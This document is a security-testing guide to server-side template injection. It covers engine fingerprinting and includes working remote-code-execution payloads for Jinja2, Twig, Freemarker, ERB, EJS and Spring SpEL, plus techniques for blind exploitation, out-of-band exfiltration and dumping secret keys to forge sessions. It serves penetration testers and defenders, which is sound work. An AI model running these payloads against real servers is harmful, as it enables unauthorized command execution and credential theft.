# Server-Side Template Injection

When user input is concatenated into a template and then the template engine evaluates it, you are not injecting data, you are injecting code into the engine's expression language. SSTI frequently chains to remote code execution because template engines expose object introspection that reaches the runtime.

## The mental model

A template engine turns `Hello {{name}}` plus data into output. If the application builds the template string from user input (`render("Hello " + user_input)`) rather than passing user input as data to a fixed template, your input is parsed as template syntax. From there you walk the language's object model to reach OS command execution. The engine determines the syntax and the escape path, so step one is always to fingerprint the engine.

## Where it hides / tell-tales

- **Anywhere a template could be built from input**: email/notification templates with user-customizable content, report generators, "custom message" fields, CMS/page builders, invoice and PDF templates, subject lines, error pages that echo input through a template, and any feature advertising "use variables like `{{name}}`."
- **Math as the first signal**: send `{{7*7}}`, `${7*7}`, `#{7*7}`, `<%= 7*7 %>`, `{7*7}`. If `49` comes back, the expression was evaluated. If `7*7` comes back literally, it was not.
- **Difference between SSTI and XSS**: `{{7*7}}` returning `49` is server-side evaluation (SSTI); `<script>` executing in the browser is client-side (XSS). They can coexist; confirm server evaluation with arithmetic, not with HTML.

## Real material

Engine fingerprinting with a polyglot and follow-ups:

```
${7*7}      -> 49 suggests Freemarker/JSP EL/Thymeleaf-ish
{{7*7}}     -> 49 suggests Jinja2/Twig/Django-like
{{7*'7'}}   -> 49 (Twig) vs 7777777 (Jinja2)  distinguishes the two
#{7*7}      -> Ruby ERB-ish / some EL
<%= 7*7 %>  -> ERB (Ruby), EJS (Node)
*{7*7}      -> Thymeleaf
```

Jinja2 (Python) to RCE, the canonical object-walk:

```
{{ ''.__class__.__mro__[1].__subclasses__() }}            # enumerate classes
{{ cycler.__init__.__globals__.os.popen('id').read() }}   # modern, short
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}  # Flask
{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

Twig (PHP):

```
{{ ['id']|filter('system') }}
{{ ['id',''] | sort('system') }}
{{ _self.env.registerUndefinedFilterCallback('system') }}{{ _self.env.getFilter('id') }}
```

Freemarker (Java):

```
<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id") }
${ "freemarker.template.utility.ObjectConstructor"?new()("java.lang.ProcessBuilder", ...) }
```

ERB (Ruby) and EJS (Node):

```erb
<%= `id` %>
<%= system("id") %>
```
```
<%= global.process.mainModule.require('child_process').execSync('id') %>   # EJS
```

Smarty, Velocity, Mako, Handlebars (via prototype/helper abuse), and Pug each have their own escape; fingerprint, then look up the chain for that engine.

## Beyond the basics

- **Sandbox escapes are the real game**: Jinja2, Twig, and others ship sandboxes. Modern exploitation is about escaping the sandbox via object introspection (`__mro__`, `__subclasses__`, `__globals__` in Python; `_self.env` in Twig; reflection in Java engines). Keep an up-to-date gadget list because engines patch specific chains.
- **Blind SSTI**: no output reflected. Confirm via timing (`{{ ''.__class__.__mro__[1].__subclasses__()[...]('sleep 5', shell=True) }}`) or out-of-band (make the server DNS/HTTP call your host). Then exfiltrate command output over the OOB channel.
- **Expression Language injection (Java)**: Spring SpEL (`T(java.lang.Runtime).getRuntime().exec('id')`), OGNL (Struts), and MVEL are SSTI's cousins and appear in search filters, `@Value`, and routing. `#{...}`/`${...}` in a Spring context is a strong tell.
- **Client vs server template confusion**: AngularJS (`{{constructor.constructor('alert(1)')()}}`) and Vue sandbox escapes are client-side template injection, which is DOM XSS with a template flavor; do not confuse with SSTI, but both are findings.
- **Minimal-footprint payloads**: length-limited fields force short gadgets (`cycler`, `lipsum`, `g` globals in Flask). Keep a short-payload set.
- **Read secrets without full RCE**: even without OS exec, template context often exposes `config`, environment variables, secret keys, and ORM objects. `{{ config }}` in Flask dumps the secret key, which lets you forge sessions (see `Session-and-Cookie-Security.md`).

## What to watch for

- `{{7*7}}` echoed literally means no server-side evaluation there; try other delimiters before concluding.
- Returning `49` confirms evaluation but not RCE; the sandbox may block the object walk. Report the confirmed primitive and attempt the engine-specific escape.
- Some frameworks auto-escape output (so HTML-looking payloads are neutralized) while still evaluating expressions; arithmetic still proves SSTI.
- RCE payloads run commands on production; use harmless commands (`id`, `hostname`) and stop at proof, do not pivot without authorization.

## Hunting checklist

- Inject the arithmetic polyglot into every field that might reach a template; look for evaluation.
- Fingerprint the engine with the distinguishing payloads (`{{7*'7'}}` etc.).
- Attempt the engine-specific object-walk to RCE with a harmless command.
- For blind cases, use timing and OOB channels.
- Check Java contexts for SpEL/OGNL EL injection.
- Even without RCE, dump `config`/env to grab secret keys and forge sessions.
